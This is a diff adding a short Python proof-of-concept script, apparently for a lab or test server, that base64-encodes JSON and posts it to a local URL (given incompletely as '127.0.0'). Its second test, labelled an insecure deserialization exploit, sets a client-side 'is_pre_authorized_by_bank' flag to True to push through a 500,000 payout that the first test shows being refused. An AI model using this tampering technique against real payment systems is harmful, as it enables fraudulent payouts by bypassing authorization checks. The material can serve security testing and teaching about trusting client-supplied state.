@@ -1,0 +1,47 @@
+import urllib.request
+import json
+import base64
+
+TARGET_URL = "http://127.0.0"
+
+def send_payload(description, data_dict):
+    print(f"\n--- Executing: {description} ---")
+    try:
+        # Step 1: Serialize to raw JSON string, encode to binary, then wrap in Base64
+        json_string = json.dumps(data_dict)
+        serialized_stream = base64.b64encode(json_string.encode('utf-8'))
+        
+        # Step 2: Construct standard HTTP network request
+        req = urllib.request.Request(
+            TARGET_URL, 
+            data=serialized_stream, 
+            headers={'Content-Type': 'application/octet-stream'}
+        )
+        
+        # Step 3: Transmit and read HTTP network response
+        with urllib.request.urlopen(req) as response:
+            print(f"HTTP Status Code: {response.getcode()}")
+            print(f"Server Response: {response.read().decode('utf-8')}")
+            
+    except urllib.error.HTTPError as e:
+        print(f"HTTP Status Code: {e.code}")
+        print(f"Server Error Response: {e.read().decode('utf-8')}")
+    except Exception as e:
+        print(f"Network Connection Failed: {str(e)}")
+
+if __name__ == "__main__":
+    # Test 1: Standard transaction exceeding business bounds
+    legitimate_payload = {
+        "account_id": "user_7656119865",
+        "payout_amount": 500000,
+        "is_pre_authorized_by_bank": False
+    }
+    send_payload("Legitimate Limit Threshold Test", legitimate_payload)
+
+    # Test 2: Exploit payload injecting state variables into the stream
+    exploit_payload = {
+        "account_id": "user_7656119865",
+        "payout_amount": 500000,
+        "is_pre_authorized_by_bank": True
+    }
+    send_payload("Insecure Deserialization Logic Exploit", exploit_payload)
